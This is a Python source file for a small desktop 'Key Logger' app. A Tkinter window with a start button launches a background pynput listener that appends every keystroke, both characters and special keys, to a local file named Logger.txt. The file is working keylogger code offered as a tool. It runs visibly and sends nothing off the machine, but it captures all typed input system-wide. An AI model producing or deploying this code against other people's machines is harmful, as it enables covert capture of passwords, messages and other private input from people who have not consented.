from pathlib import Path
from tkinter import Tk, Canvas, Button, PhotoImage
from threading import Thread
from pynput import keyboard

OUTPUT_PATH = Path(__file__).parent
ASSETS_PATH = OUTPUT_PATH / Path(r"/Users/pratyushmishra/Documents/Key Logger/assets/frame0")

def relative_to_assets(path: str) -> Path:
    return ASSETS_PATH / Path(path)

window = Tk()
window.geometry("900x600")
window.configure(bg="#FFFFFF")
window.title("Key Logger")

canvas = Canvas(
    window,
    bg="#FFFFFF",
    height=600,
    width=900,
    bd=0,
    highlightthickness=0,
    relief="ridge"
)
canvas.place(x=0, y=0)

image_image_1 = PhotoImage(file=relative_to_assets("image_1.png"))
image_1 = canvas.create_image(
    450.0,
    300.0,
    image=image_image_1
)

button_image_1 = PhotoImage(file=relative_to_assets("button_1.png"))
button_1 = Button(
    image=button_image_1,
    borderwidth=0,
    highlightthickness=0,
    command=lambda: start_keylogging(),
    relief="flat"
)
button_1.place(
    x=583.0,
    y=328.0,
    width=143.0,
    height=44.0
)

button_image_hover_1 = PhotoImage(file=relative_to_assets("button_hover_1.png"))

def button_1_hover(e):
    button_1.config(image=button_image_hover_1)

def button_1_leave(e):
    button_1.config(image=button_image_1)

button_1.bind('<Enter>', button_1_hover)
button_1.bind('<Leave>', button_1_leave)

# Key logging functionality using pynput
def on_press(key):
    try:
        with open("Logger.txt", "a") as log_file:
            log_file.write(f"{key.char}\n")
    except AttributeError:
        with open("Logger.txt", "a") as log_file:
            log_file.write(f"{key}\n")

def start_logging():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def start_keylogging():
    print("Key logging started...")
    logging_thread = Thread(target=start_logging, daemon=True)
    logging_thread.start()

window.resizable(False, False)
window.mainloop()
